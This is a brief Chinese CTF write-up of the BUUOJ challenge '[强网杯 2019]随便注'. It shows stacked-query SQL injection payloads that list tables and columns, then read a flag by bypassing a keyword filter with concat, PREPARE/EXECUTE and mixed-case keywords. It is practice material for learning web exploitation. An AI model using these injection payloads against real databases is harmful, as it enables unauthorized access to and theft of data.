### buuoj_[强网杯 2019]随便注（sql注入）

打开界面，先测试一下闭合

![](https://pic.imgdb.cn/item/60f3cd465132923bf82f91ac.jpg)

然后构造语句

```
/?inject=1' and (extactvalue(1,concat(0x7e,(select database()),0x7e))) --+
```

![](https://pic.imgdb.cn/item/60f3cda55132923bf833047e.jpg)

返回了个正则过滤

修改一下语句

```
?inject=1' and extractvalue(0x0a,concat(0x0a,(database()))) --+
```

![](https://pic.imgdb.cn/item/60f3cde55132923bf8356aeb.jpg)

获得数据库名

然后输出表名，列名

```
0';show tables;#
```

![](https://pic.imgdb.cn/item/60f3d0985132923bf84f195d.jpg)

```
0';show columns from words;#
```

![image-20210718145716948](C:\Users\EXCEPTION\AppData\Roaming\Typora\typora-user-images\image-20210718145716948.png)

```
0';show columns from `1919810931114514`;#		#不知道为什么要加单引号，但是不加不行。
```

![](https://pic.imgdb.cn/item/60f3d1455132923bf8558feb.jpg)

然后就，不会了，难搞

然后看了下大佬的wp，tql tql

构造playload

```
1';set @a=concat("sel","ect flag from `1919810931114514`");prepare hello from @a;execute hello;#		#concat将两个字符串结合起来，即select flag from ''
```

![](https://pic.imgdb.cn/item/60f3d4785132923bf8740772.jpg)

返回了一个过滤语句，但是可以使用大小写混淆绕过

```
1';SEt @a=concat("sel","ect flag from `1919810931114514`");prEPare hello from @a;execute hello;#
```

![](https://pic.imgdb.cn/item/60f3d4b75132923bf8765330.jpg)

成功了，太强了大佬

补充，感觉和函数调用确实挺像的

>1. PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用
>2. EXECUTE ：执行命令
>3. DEALLOCATE PREPARE：释放命令
>4. SET：设置变量